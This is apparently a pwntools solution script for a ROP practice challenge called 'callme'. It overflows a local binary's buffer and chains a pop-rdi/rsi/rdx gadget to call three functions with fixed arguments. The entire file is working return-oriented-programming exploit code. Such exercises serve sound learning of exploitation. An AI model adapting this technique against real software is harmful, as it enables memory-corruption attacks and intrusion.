#!/usr/bin/env python3


from pwn import *

#pattern
offset = b'A' * 40


#gadget
gadget = p64(0x000000000040093c) # pop rdi; pop rsi; pop rdx; ret; 

# Functions
func_1 = p64(0x0000000000400720)
func_2 = p64(0x0000000000400740)
func_3 = p64(0x00000000004006f0)

#Params passed by the functions
param_1 = p64(0xdeadbeefdeadbeef)
param_2 = p64(0xcafebabecafebabe)
param_3 = p64(0xd00df00dd00df00d)

b = gadget + param_1 + param_2 + param_3

payload = offset + b + func_1 + b + func_2 + b + func_3


p = process("./callme")
p.sendline(payload)
p.interactive()
